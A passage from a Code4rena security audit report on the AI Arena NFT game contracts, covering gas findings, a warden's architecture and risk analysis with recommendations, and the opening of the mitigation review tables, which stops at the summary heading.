## [G-18] `AiArenaHelper.createPhysicalAttributes()` should check for `iconsType` before running icons-relevant code since icons fighters are rare

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L100-L105

### Description

Since icon fighter NFTs are rare, the below checks related to icons should not run for non-icon fighters.

```solidity
            for (uint8 i = 0; i < attributesLength; i++) {
                if (
                  i == 0 && iconsType == 2 || // Custom icons head (beta helmet)
                  i == 1 && iconsType > 0 || // Custom icons eyes (red diamond)
                  i == 4 && iconsType == 3 // Custom icons hands (bowling ball)
                ) {
                    finalAttributeProbabilityIndexes[i] = 50;
                } else {
                    //set finalAttributeProbabilityIndexes[i] a different way
```

### Recommended Fix

Instead of running through all 3 icons checks every time, check to see if `iconsType` is greater than zero before running through the 3 checks.

## [G-19] `AiArenaHelper` constructor sets probabilities twice

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L41-L52

### Description

Notice below that the constructor sets the probabilities twice:

```solidity
    constructor(uint8[][] memory probabilities) {
        _ownerAddress = msg.sender;

        // Initialize the probabilities for each attribute
        addAttributeProbabilities(0, probabilities);

        uint256 attributesLength = attributes.length;
        for (uint8 i = 0; i < attributesLength; i++) {
            attributeProbabilities[0][attributes[i]] = probabilities[i];
            attributeToDnaDivisor[attributes[i]] = defaultAttributeDivisor[i];
        }
    } 
```

### Recommended Fix

Remove the `for` loop.

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1798#issuecomment-1975526126)**



***


# Audit Analysis

For this audit, 42 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1227) by **0xSmartContract** received the top score from the judge.

*The following wardens also submitted reports: [yongskiws](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2035), [0xepley](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2028), [aariiif](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1990), [hunter\_w3b](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1672), [ZanyBonzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1586), [14si2o\_Flint](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1496), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1200), [popeye](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1178), [0xweb3boy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/469), [rspadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/279), [hassanshakeel13](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2025), [ansa-zanjbeel](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2005), [Rolezn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1965), [cheatc0d3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1961), [peanuts](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1960), [tala7985](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1934), [0xbrett8571](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1921), [wahedtalash77](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1905), [fouzantanveer](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1892), [foxb868](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1850), [Myd](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1849), [0xblack\_bird](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1823), [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1800), [cudo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1703), [0xStriker](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1529), [SAQ](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1512), [clara](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1470), [scokaf](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1399), [0xAsen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1390), [albahaca](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1385), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1376), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1368), [K42](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1259), [PoeAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/995), [JayShreeRAM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/779), [pipidu83](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/586), [shaflow2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/560), [Bauchibred](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/498), [JcFichtner](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/223), [DarkTower](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/104), and [kaveyjoe](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/102).*

### Summary
| List |Head |Details|
|:--|:----------------|:------|
|a) |The approach I followed when reviewing the code | Stages in my code review and analysis |
|b) |Analysis of the code base | What is unique? How are the existing patterns used? "Solidity-metrics" was used  |
|c) |Test analysis | Test scope of the project and quality of tests |
|d) |Security Approach of the Project | Audit approach of the Project |
|e) |Other Audit Reports and Automated Findings | What are the previous Audit reports and their analysis |
|f) |Packages and Dependencies Analysis | Details about the project Packages |
|g) |Other recommendations | What is unique? How are the existing patterns used? |
|h) |New insights and learning from this audit | Things learned from the project |

### Approach

First, by examining the scope of the code, I determined my code review and analysis strategy.
https://github.com/code-423n4/2024-02-ai-arena

Accordingly, I analyzed and audited the subject in the following steps;

| Number |Stage |Details|Information|
|:--|:----------------|:------|:------|
|1|Compile and Run Test|[Installation](https://github.com/code-423n4/2024-02-ai-arena?tab=readme-ov-file#tests)|Test and installation structure is simple, cleanly designed|
|2|Architecture Review| [AI Arena](https://docs.aiarena.io/gaming-competition) |Provides a basic architectural teaching for General Architecture|
|3|Graphical Analysis  |Graphical Analysis with [Solidity-metrics](https://github.com/ConsenSys/solidity-metrics)|A visual view has been made to dominate the general structure of the codes of the project.|
|4|Slither Analysis  | [Slither Report](https://github.com/code-423n4/2024-02-ai-arena/blob/main/slither.txt)| |
|5|Test Suits|[Tests](https://github.com/code-423n4/2024-02-ai-arena?tab=readme-ov-file#tests)|In this section, the scope and content of the tests of the project are analyzed.|
|6|Manuel Code Review|[Scope](https://github.com/code-423n4/2024-02-ai-arena?tab=readme-ov-file#scoping-details)|
|7|Infographic|[Figma](https://www.figma.com/)|I made Visual drawings to understand the hard-to-understand mechanisms|
|8|Special focus on Areas of  Concern|[Areas of Concern](https://github.com/code-423n4/2024-02-ai-arena?tab=readme-ov-file#scope)||

### Analysis of the code base

The most important summary in analyzing the code base is the stacking of codes to be analyzed.
In this way, many predictions can be made, including the difficulty levels of the contracts, which one is more important for the auditor, the features they contain that are important for security (payable functions, uses assembly, etc.), the audit cost of the project, and the time to be allocated to the audit

In addition, the auditor can decide on the question of where should I end the audit by examining these metrics;

Uses Consensys Solidity Metrics
-  **Lines:** total lines of the source unit
-  **nLines:** normalized lines of the source unit (e.g. normalizes functions spanning multiple lines)
-  **nSLOC:** normalized source lines of code (only source-code lines; no comments, no blank lines)
-  **Comment Lines:** lines containing single or block comments
-  **Complexity Score:** a custom complexity score derived from code statements that are known to introduce code complexity (branches, loops, calls, external interfaces, ...)

<img width="730" alt="image" src="https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/37ea9504-fdca-40cd-a4f0-aa4ead9ec6d6">

### Project - Entry Point - FighterFarm.sol ;

1. The `reRoll` function implements business logic after the `_neuronInstance.transferFrom` call. This may result in the `reRoll` function being called again and causing unexpected behavior. Always implement business logic before the call

2. **DoS**: The `redeemMintPass` function uses a loop to burn multiple mint passes. If the `burn` operation for a `mintpassIdToBurn` fails, the entire operation is rolled back. This could lead to a malicious user making this function of the contract unusable, causing the transaction to fail.
    - **Recommendation**: Manage each `burn` operation separately using `try-catch` and log the failed ones.

3. **Unchecked Return Values**: The return value of the `_neuronInstance.transferFrom` call in the `reRoll` function is not checked. This could cause the transaction to fail silently if the transfer fails.
    - **Recommendation**: Check the return value to verify that the transfer was successful.

4. **Front-Running**: `claimFighters` and `redeemMintPass` functions allow users to create NFTs based on certain parameters. Publicly publishing these parameters (e.g., `modelHashes`) on the blockchain carries the risk that malicious users can see the transaction and take action in their favor (e.g., pre-snatch more valuable NFTs).
    - **Recommendation**: Prevent such front-running attacks by using commit-reveal scheme.

### Gas Optimizations

1. **Gas Optimization**: Frequently used `length` calls within `for` loops can increase gas costs. Especially in the `redeemMintPass` and `claimFighters` functions, the loop calls `fighters.length` at each iteration.
    - **Suggestion**: Store `length` in a variable before the loop and use this variable inside the loop.

2. **Use of ERC721 and ERC721Enumerable**: `ERC721Enumerable` maintains a list of all tokens, which can significantly increase gas costs for large collections.
    - **Recommendation**: If your collection is large and the list of tokens owned by each user is not needed frequently, you may consider removing `ERC721Enumerable`.

![image](https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/000edf8a-2cb9-4cd2-81b1-9d64985f916b)

**Note: Please click on the image to enlarge it**

### RankedBattle.sol

**1. DoS (Denial of Service) Risk:**
- The `updateBattleRecord` function may consume a lot of gas under certain conditions or be exploited by a malicious user. For example, very high `eloFactor` values may cause the operation to fail.

**2. Magic Numbers:**
- Constant values such as `VOLTAGE_COST` or `bpsLostPerLoss` are used directly in various places in the code. Documenting the meaning of these values and why they were chosen makes the code easier to read and maintain.

**3. Function Visibility and Modifiers:**
- Using `modifier` for authorization checks reduces code repetition and increases readability.

### Gas Optimizations

**1. Optimization on Frequently Called Functions:**
- It is important to optimize calculations to reduce gas costs in frequently called functions such as `updateBattleRecord`. For example, calculations with constant values can be precomputed.

**2. Loops and Big Data Structures:**
- Using loops on large data structures can increase gas cost. In functions like `getUnclaimedNRN`, limiting the maximum number of rounds users can take or organizing data structures more efficiently can save gas.

**3. Optimization of Access to State Variables:**
- Gas can be saved by copying frequently accessed `state` variables to `memory` variables and performing operations on these variables.

<img width="699" alt="image" src="https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/29c4a0a4-3a1b-4949-9424-f910ab914ba3">

**Note: Please click on the image to enlarge it**

### MergingPool.sol

This Solidity contract includes a management and reward distribution mechanism that provides a number of special functionalities. Below are brief summaries of the contract's functions and constructor:

**Constructor**
- **Constructor**: The contract owner sets the ranked battle contract and warrior farm contract addresses. The contract identifies the owner as an admin.

**External Functions**
- **transferOwnership**: Transfers contract ownership to another address. Can only be summoned by the current owner.
- **adjustAdminAccess**: Grants or removes admin access to a specific address. Can only be summoned by its owner.
- **updateWinnersPerPeriod**: Updates the number of winners per contest period. It can only be called by admins.
- **pickWinner**: Picks the winners for the current round. The number of winners must match the expected number of winners per period. It can only be called by admins.
- **claimRewards**: Allows users to collectively claim rewards for multiple rounds. The user can only claim rewards once per round.

**Public Functions**
- **addPoints**: Adds merge pool points to a warrior. It can only be summoned by the ranked battle contract address.
- **getFighterPoints**: Gets points of fighters up to the specified maximum token ID.

**Architecture Summary**
This contract provides a reward and management system for warriors. Warriors can earn points through ranked battles and other events. Admins can select winners during certain periods, and these winners can claim their rewards to create new fighters with specific model URIs, model types, and special features. Users can view and claim the number of rewards they have earned.

The contract protects management functions with a strict access control mechanism, allowing only certain addresses (owner and admins) to perform management functions and reward distribution. This ensures the security of the contract and the correct use of its functionality. It also offers a mechanism to manage points from ranked battles and other events, rewarding warriors' performance and participation.

![image](https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/d3feebb6-95b4-4338-8b7a-cde09668c284)

**Note: Please click on the image to enlarge it**

Contract Details -  MergingPool.sol ; 

![image](https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/a395678e-9d63-4be1-a8c4-993d4ea9778c)

**Note: Please click on the image to enlarge it**

### AiArenaHelper.sol

It functions as the AI Arena utility and enables the creation of physical attributes for a particular fighter.

**State Variables**

- `attributes`: List of attributes that fighters can have (e.g. "head", "eyes", etc.).
- `defaultAttributeDivisor`: Default values of each attribute's DNA dividers.
- `_ownerAddress`: Address of the contract owner.
- `attributeProbabilities`: A mapping that keeps track of attribute probabilities for each generation.
- `attributeToDnaDivisor`: A mapping that keeps track of the DNA dividers specific to each attribute.

**Constructor**

- When starting the contract, sets the trait probabilities for generation 0 and initializes the DNA splitter of each trait with default values.

**External Functions**

- `transferOwnership`: Transfers contract ownership to another address.
- `addAttributeDivisor`: Adds or updates DNA dividers for each attribute.
- `createPhysicalAttributes`: Creates a fighter's physical attributes based on the given DNA, lineage, icon type and dendroid status.

**Public Functions**

- `addAttributeProbabilities`: Adds attribute probabilities for a given generation.
- `deleteAttributeProbabilities`: Deletes attribute probabilities for a given generation.
- `getAttributeProbabilities`: Returns attribute probabilities for a given generation and trait.
- `dnaToIndex`: Converts the given DNA and its rarity into a trait probability index.

**Architectural Summary**

This contract is designed to manage the characteristics of fighters in the AI Arena. The contract contains complex logic used to create fighters' physical attributes. It governs DNA splitters for each trait and trait probabilities that vary across generations.

![image](https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/46f4be1e-ecfd-48c0-92a8-9b0d41af5ee4)

**Note: Please click on the image to enlarge it**

1. **Hard Coded Limitations**: Within the `createPhysicalAttributes` function there are hard coded control structures for some attributes (e.g. special cases based on `iconsType` values). This approach may limit the extensibility and flexibility of the contract.
    - **Recommendation**: Consider managing such controls through an external configuration or management mechanism to enable more dynamic management of features and behaviors.

2. **Role Based Access Control**: The contract authorizes the owner to perform administrative functions (e.g. `transferOwnership`, `addAttributeDivisor`). However, this may not be enough for growing projects that may require more complex access control mechanisms.
    - **Recommendation**: Create a more flexible and secure role-based access control system using OpenZeppelin's `AccessControl` contract.

3. **Data Validation**: Validating input data is important, especially when it comes to outsourced parameters. Functions such as `addAttributeProbabilities` and `addAttributeDivisor` check input lengths, but more extensive validations may be required.
    - **Recommendation**: Add comprehensive validation mechanisms to ensure accuracy and validity of input data.

### GameItems.sol

This contract provides management of in-game items for AI Arena. It supports multiple token types using the ERC1155 standard.

1. **DoS by Block Gas Limit**: The `mint` function, especially in combination with the `finiteSupply` control and the `dailyAllowance` control, performs multiple operations in a loop. If these transactions consume too much gas, the block may reach its gas limit and cause transactions to fail.
    - **Recommendation**: Limit the maximum amount users can mint at once or optimize transactions to reduce gas usage.

2. **Unchecked External Call Return Values**: The return value of the `_neuronInstance.transferFrom` call is not checked in the `mint` function. This could cause the transaction to fail silently if the transfer fails.
    - **Recommendation**: Check the return value of the ERC20 `transferFrom` function and throw an appropriate error message if the operation fails.

3. **Magic Strings and Numbers**: "Magic strings" and "magic numbers" are used in many places in the contract, especially in URI management and time intervals.
    - **Recommendation**: Make the code easier to read and maintain by replacing magic numbers and strings with constants.

4. **Role-Based Access Control (RBAC)**: Managing roles such as `isAdmin` and `allowedBurningAddresses` may require more complex access control mechanisms.
    - **Recommendation**: Provide more flexible and secure role-based access control using OpenZeppelin's `AccessControl` contract.
    - 

![image](https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/1d8d555c-3e84-4fe2-aba5-7746e2578a7d)

**Note: Please click on the image to enlarge it**

```solidity
/// @notice Returns the URI where the contract metadata is stored.
    /// @return URI where the contract metadata is stored.
    function contractURI() public pure returns (string memory) {
        return "ipfs://bafybeih3witscmml3padf4qxbea5jh4rl2xp67aydqvqsxmyuzipwtpnii";
    }


function return value;
{
  "name": "AI Arena Game Items",
  "description": "In-game items to be used while playing AI Arena",
  "image": "https://ipfs.fleek.co/ipfs/bafybeic3p46ben4yqgwikt5bnz4qmqasbmrnnd6jrgamth7jk47xjwfq7q",
  "external_link": "https://gaming.aiarena.io/",
  "seller_fee_basis_points": 800,
  "fee_recipient": "0xd82F671a08DBb96Fff1334EE7992ce2E1A219c7C"
}
```

Both IPFS and Arweave store data immutably, but Arweave guarantees permanent storage with a one-time fee.

IPFS (InterPlanetary File System) and Arweave offer decentralized file storage solutions, but with key differences and security benefits that vary depending on use cases. The importance of using Arweave from a security perspective is particularly evident in persistent storage and data integrity issues.

### Security Benefits of Arweave

1. **Persistent Storage**: Arweave permanently stores data in a structure called a "block mesh". This means that once uploaded to Arweave, it is not possible for data to be deleted or lost. This feature provides a significant security benefit for data that must not be deleted or altered, such as copyright material, legal documents, or historical records.

2. **Data Integrity**: Arweave guarantees data integrity by using the hash value of each stored item. This means that stored data cannot be modified or corrupted over time. Users can be assured that the data they store is original and will remain unchanged.

3. **Economic Incentives**: Arweave offers economic incentives for data storage and access. Payment is made for storing data, and this payment guarantees that the data is permanently stored on the network. This solves the problem that data encountered in IPFS can be lost over time, because in IPFS nodes must actively host and pin data for data to remain constantly accessible.

4. **Greater Security and Durability**: Arweave's persistent storage model offers an extra layer of protection against data being censored or altered. This is especially important in situations where censorship or data manipulation is a concern.

### To Compare

- **IPFS** stores and shares data in a decentralized manner, but nodes must actively host that data for it to remain constantly accessible. Extra steps (e.g. using pinning services) may be required to permanently store data in IPFS.
- **Arweave** differs from IPFS in storing data persistently and providing high data integrity. Arweave guarantees that once you store data, it will be retained forever.

As a result, Arweave's security relevance is particularly evident in areas such as persistent storage, data integrity, and censorship resistance.

### Test analysis

**What did the project do differently?**
- It can be said that the developers of the project did a quality job, there is a test structure consisting of tests with quality content.

**Test Coverage and Depth**<br>
- Wide Function Testing: Test files cover many parts of your contracts (%90 Coverage). This means you check if every part of your system works in different situations.
- Both Good and Bad Scenarios: Test files look at both when things go right and when they should fail and give an error. This makes sure your contracts can handle unexpected situations well.

**Testing Strategies and Approaches**<br>
- Looking at Edge Cases: Test files think about special or extreme situations to make sure your contracts can handle them.
- Focus on Security: Tests like `RankedBattleTest` check important parts of your contracts to keep them safe. This is very important for smart contracts.
- Testing How Things Work Together: Test files  also see how different contracts work with each other. This shows that your whole project works well as one system.

**What could they have done better?**

- If we look at the test scope and content of the project with a systematic checklist, we can see which parts are good and which areas have room for improvement As a result of my analysis, those marked in green are the ones that the project has fully achieved. The remaining areas are the development areas of the project in terms of testing ;

<img width="1522" alt="image" src="https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/01efd435-cc9e-4282-ad45-08667a62d7fe">

Ref: https://xin-xia.github.io/publication/icse194.pdf

- Overall line coverage percentage provided by your tests : 90 (As a generally accepted safety rule, 100% test coverage is recommended)

- Test Tools/Technologies analysis of the project;

<img width="982" alt="image" src="https://github.com/code-423n4/2024-02-ai-arena/assets/104318932/ef2ef752-5dc1-4d21-bdbe-65b95bf0a279">

### Security Approach of the Project

**Successful current security understanding of the project;**

1. They manage the 1nd audit process with an innovative audit such as Code4rena, in which many auditors examine the codes. 

**What the project should add in the understanding of Security;**

1. By distributing the project to testnets, ensuring that the audits are carried out in onchain audit. (This will increase coverage)

2. After the project is published on the mainnet, there should be emergency action plans (not found in the documents)

3. Add On-Chain Monitoring System; If On-Chain Monitoring systems such as Forta are added to the project, its security will increase.

For example ; This bot tracks any DEFI transactions in which wrapping, unwrapping, swapping, depositing, or withdrawals occur over a threshold amount. If transactions occur with unusually high token amounts, the bot sends out an alert. https://app.forta.network/bot/0x7f9afc392329ed5a473bcf304565adf9c2588ba4bc060f7d215519005b8303e3

4. After the Code4rena audit is completed and the project is live, I recommend the audit process to continue, projects like immunefi do this. 
https://immunefi.com/

5. Emergency Action Plan
In a high-level security approach, there should be a crisis handbook like the one below and the strategic members of the project should be trained on this subject and drills should be carried out. Naturally, this information and road plan will not be available to the public.
https://docs.google.com/document/u/0/d/1DaAiuGFkMEMMiIuvqhePL5aDFGHJ9Ya6D04rdaldqC0/mobilebasic#h.27dmpkyp2k1z

6. ChainAnalysis oracle
With the ChainAnalysis oracle, OFAC interaction can be blocked so that legal issues do not arise

7. We also recommend that you have an "Economic Audit" for projects based on such complex mathematics and economic models. An example Economic Audit is provided in the link below;
Economic Audit with [Three Sigma](https://panoptic.xyz/blog/panoptic-three-sigma-partnership)

8. As the project team, you can consider applying the multi-stage audit model.

<img width="498" alt="image" src="https://github.com/code-423n4/2023-12-ethereumcreditguild/assets/104318932/7ad49e46-4998-4bf2-830e-711039ea97a8">

Read more about the MPA model;<br>
https://mpa.solodit.xyz/

9. I recommend having a masterplan applied to project team members (This information is not included in the documents).
All authorizations, including NPM passwords and authorizations, should be reserved only for current employees. I also recommend that a definitive security constitution project be found for employees to protect these passwords with rules such as 2FA. The LEDGER hack, which has made a big impact recently, is the best example in this regard;

https://twitter.com/Ledger/status/1735326240658100414?t=UAuzoir9uliXplerqP-Ing&s=19

10. Another security approach I can recommend is 0xDjango's security approaches in a project. This approach divides security into layers (Test, Automatic Tool, Individual Audit, Corporate Audit, Economic Audit) and aims to have each part done separately by experts in the field. I can also recommend this approach to you;

https://x.com/0xDjangoOnChain/status/1748402771684909094?s=20

### Other Audit Reports and Automated Findings 

**Automated Findings:**
https://github.com/code-423n4/2024-02-ai-arena/blob/main/bot-report.md

The Automated analysis identifies several security-related issues, such as potential Denial of Service (DOS) attacks through unbounded loops ([`M-01`], [`L-05`]), lack of proper validation for array lengths ([`L-06`]), and the absence of checks for null addresses ([`L-07`], [`L-12`]). Addressing these issues is crucial for preventing attacks that could compromise contract integrity and user assets.

### Centralization Risk

**Owner Role**

1. **Single Point Failure Risk:** If the private key under the control of `_ownerAddress` is compromised or lost, the entire system is compromised.
2. **Risk of Abuse of Authority:** The contract owner may abuse his powers, for example, arbitrarily transfer funds or change roles in the system.

**Code Pattern Used**

By using `require(msg.sender == _ownerAddress);` it follows a pattern that ensures that certain functions can only be called by the contract owner. This indicates a centralized management model.

**Suggestions**

1. **Multisig Mechanism:** A multi-signature mechanism can be used that shares the powers of the contract owner among more than one address. This reduces the risk of a single point of failure and prevents abuse of authority.

2. **Transition to DAO Structure:** Moving project management and decision-making processes to a DAO (Decentralized Autonomous Organization) structure gives community members more say and reduces centralization.

3. **Time Lock and Escalation Mechanisms:** A time lock mechanism can be implemented so that critical functions can be called. This prevents sudden changes and gives the community a chance to review upgrades and changes.

### Packages and Dependencies Analysis 📦

| Package                                                                                                                                     | Version                                                                                                               | Usage in the project                               | Audit Recommendation                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- | -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| [`openzeppelin`](https://www.npmjs.com/package/@openzeppelin/contracts)         | [![npm](https://img.shields.io/npm/v/@openzeppelin/contracts.svg)](https://www.npmjs.com/package/@openzeppelin/contracts)                         | A lot of OZ contracts |-  Version `4.7.3` is used by the project, it is recommended to use the newest version `5.0.1`| 


### Other recommendations

✅ The use of assembly in project codes is very low, I especially recommend using such useful and gas-optimized code patterns; https://github.com/dragonfly-xyz/useful-solidity-patterns/tree/main/patterns/assembly-tricks-1

✅ A good model can be used to systematically assess the risk of the project, for example this modeling is recommended; https://www.notion.so/Smart-Contract-Risk-Assessment-3b067bc099ce4c31a35ef28b011b92ff#7770b3b385444779bf11e677f16e101e

✅ All staff accounts for the project should have control policies that require 2FA and must use 2FA wherever possible.
- 100% comprehensive security cannot be achieved based on smart contract codes alone.
- Implement a more comprehensive policy to enforce non-SMS 2FA.
- You can find the latest Simswap attack on Code4rena and details about it in [this article](https://medium.com/code4rena/code4rena-twitter-x-incident-8b7f308a555d).

✅ I recommend you to set up a `system.sol` basic architecture where all contracts are registered.
- The entire system can revolve around a single contract, like SystemRegistry. This is the contract that ties all the other contracts together, and from this contract we should be able to list all the other contracts in the system. It's almost like a registry. 

✅ Analyze the gas usage of each function under various conditions in tests to ensure efficiency and identify potential optimizations.	

### Time spent:
24 hours

**[brandinho (AI Arena) acknowledged](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1227#issuecomment-1975512872):**

**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1227#issuecomment-2006381031):**
 > Most comprehensive analysis out of all I've seen, though there is room for improvement in the signal to noise ratio.



***

# [Mitigation Review](#mitigation-review)

## Introduction

Following the C4 audit, 3 wardens ([d3e4](https://code4rena.com/@d3e4), [fnanni](https://code4rena.com/@fnanni), and [niser93](https://code4rena.com/@niser93)) reviewed the mitigations for all identified issues. Additional details can be found within the [C4 AI Arena Mitigation Review repository](https://github.com/code-423n4/2024-04-ai-arena-mitigation).

## Overview of Changes

**[Summary from the Sponsor](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#overview-of-changes):**

- Fixed issues with tokenId restrictions: There was an issue when re-rolling for fighters with token IDs greater than 255 which has been addressed.

- Override fixes in safeTransferFrom

- DNA generation fixes: Issues in the generation process during minting from the merging pool and in the re-roll and claim functions have been fixed.

- Non-transferable GameItems fix: There was a bug that allowed non-transferable game items to be transferred, which has been fixed.

- Mitigation of reentrancy in claimRewards: Reentrancy attack was mitigated.

- Uninitialized numElements variable: An uninitialized variable numElements was fixed.

- ECRecover vulnerability: A known vulnerability with ECRecover was addressed.

- Update to ranking and staking mechanisms: There were fixes to staking requirements and an update to ranked battle contracts.

Areas of specific concern would be:

- Reentrancy vulnerabilities.
- Signature malleability in ECRecover.
- Non-transferable items being transferred.


## Mitigation Review Scope

### Branch
[Mitigations branch](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/15)

### Mitigations of High & Medium Severity Issues

| URL | Mitigation of | Original Issue | Purpose | 
| ----------- | ------------- | ----------- | ----------- |
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/2 | H-01 | [#739](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/739) | Fixed safeTransferFrom override with data | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/4 | H-02 | [#575](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575) | fixed Non-transferable GameItems being transferred with GameItems::safeBatchTransferFrom | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/10 | H-03 | [#366](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/366) | Mitigation for Players have complete freedom to customize the fighter NFT when calling redeemMintPass and can redeem fighters of types Dendroid and with rare attributes | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/17/ | H-04 | [#306](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306) |  | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/1 | H-06 | [#68](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68) | Fixed reRoll for fighters with tokenIds greater than 255 | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/7 | H-07 | [#45](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45) |  | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/6 | H-08 | [#37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37) |  | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16 | M-03 | [#932](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932) |  | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/12 | M-04 | [#868](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868) | Mitigation for DoS in MergingPool::claimRewards function and potential DoS in RankedBattle::claimNRN function if called after a significant amount of rounds passed.|
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/11 & https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/3 | M-05 | [#1017](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017) & [#578](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/578) | Updated dna generation in reRoll and updated dna generation in claimFighters. Also, fixed dna generation in mintFromMergingPool. | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/9 | M-06 | [#137](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137) | Mititgation for NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered(steal protocol's token) |
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/18 | M-08 | [#47](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47) |  | 

### Additional scope to be reviewed

These are additional changes in scope for the mitigation review.

| URL | Reference ID | Original Issue |Purpose | 
| ----------- | ----------- |----------- |----------- |
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/5 | ADD-01 | [#48](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/48) | Mitigated claimRewards reentrancy, fixed uninitialized numElements and fixed points intialization to match maxId | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/8 | ADD-02 | [#507](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/507) | Fixed Ecrecover is known to be vulnerable to signature malleability |
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/13 | ADD-03 | [#704](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/704) | Mititgated QA Report for #704 | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/14 | ADD-04 | [#1490](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1490) | Mitigated unstakeNRN and setNewRound and mint upto MAX_SUPPLY | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/15 | ADD-05 | N/A | Admin setup function and new require conditions for staking and unstaking. Unstaking require correction | 
| https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16/commits/d81beee0df9c5465fe3ae954ce41300a9dd60b7f | ADD-06 | N/A | Mitigation for gas intensive setUpAirdrop function and airdrop mechanism. Missing finalized test for new airdrop mechanism but working Airdrop script based on merkle root and proof. | 


## Mitigation Review Summary

